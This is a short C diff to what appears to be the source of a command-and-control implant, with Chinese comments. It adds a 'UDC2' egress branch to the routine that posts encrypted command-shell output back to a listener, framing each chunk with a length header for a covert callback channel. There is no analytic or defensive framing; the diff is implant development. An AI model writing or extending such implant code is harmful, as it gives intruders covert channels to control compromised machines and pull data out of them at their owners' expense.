@@ -33,6 +33,9 @@ extern sessdata bigsession;
 /* 决定是否需要执行POST */
 extern int http_post_len;
 
+/* tier-2 item6: engage-mode egress for encrypted callback chunks */
+extern void udc2_queue(char * data, int length);
+
 void command_shell_post(char * buffer, int length, int type, BOOL sendNow) {
 	DWORD bar = 0;
 
@@ -45,6 +48,16 @@ void command_shell_post(char * buffer, int length, int type, BOOL sendNow) {
 	if (post_type == POST_HTTP) {
 		/* 只有HTTP发送支持响应队列。如果要求则绕过队列 */
 		http_put(post_url, cipherdata, bar, sendNow);
+	}
+	else if (post_type == POST_UDC2) {
+		/* engage mode never submits the HTTP POST queue; carry each
+		 * encrypted chunk in the classic [4B BE length][chunk] body
+		 * format every listener frame expects (http_put shape) */
+		unsigned int flen = htonl(bar);
+		char head[4];
+		memcpy(head, &flen, 4);
+		udc2_queue(head, 4);
+		udc2_queue(cipherdata, bar);
 	}
 
 	/* 我（调用者）负责释放command_shell_encrypt指针！ */
